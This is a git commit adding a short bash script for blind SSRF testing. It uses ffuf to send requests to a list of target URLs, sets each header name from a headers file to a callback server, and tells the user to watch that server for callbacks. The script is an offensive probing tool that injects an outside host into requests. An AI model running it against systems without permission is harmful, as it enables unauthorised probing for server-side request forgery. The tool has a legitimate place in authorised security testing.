548eee00d83676b04f9d4096c51207fa9a5d4e46
lemosnlmb <80685782+lemosnlmb@users.noreply.github.com>
2022-07-10 12:49:59 -0400

    Add files via upload

---
+++ ssrf/blind-ssrf-headers/blind-ssrf-headers.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+#Coded by @lemosnlmb
+
+#Colors
+RED='\033[1;31m'
+NC='\033[0m'
+
+list=$1
+server=$2
+
+#Taking out http(s) protocol scheme from server URL
+server_fix=$(echo $server | sed -r "s/https?:\/\///")
+
+echo -e "${RED}CHECK YOUR SERVER FOR POTENTIALS CALLBACKS!${NC}"
+ffuf -v -w $list:W1,headers.txt:W2 -H "W2: $server_fix" -u W1 2 > /dev/null
